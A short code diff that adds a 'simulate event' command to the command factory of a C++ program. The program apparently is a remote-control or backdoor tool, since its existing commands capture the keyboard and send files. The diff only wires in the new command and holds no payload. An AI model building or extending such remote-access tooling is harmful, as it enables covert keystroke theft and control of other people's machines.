@@ -37,6 +37,7 @@
 #include "BD_CP_UpdateVariables.h"
 #include "BD_CP_CaptureKeyboard.h"
 #include "BD_CP_SendFile.h"
+#include "BD_CP_SimulateEvent.h"
 
 class BDCommand *BuildCommandFromData( unsigned long dwType )
 {
@@ -80,6 +81,8 @@ class BDCommand *BuildCommandFromData( unsigned long dwType )
 		return new BD_CP_CaptureKeyboard();
 	case BD_CP_SEND_FILE:
 		return new BD_CP_SendFile();
+	case BD_CP_SIMULATE_EVENT:
+		return new BD_CP_SimulateEvent();
 
 	default:
 		// Log Error
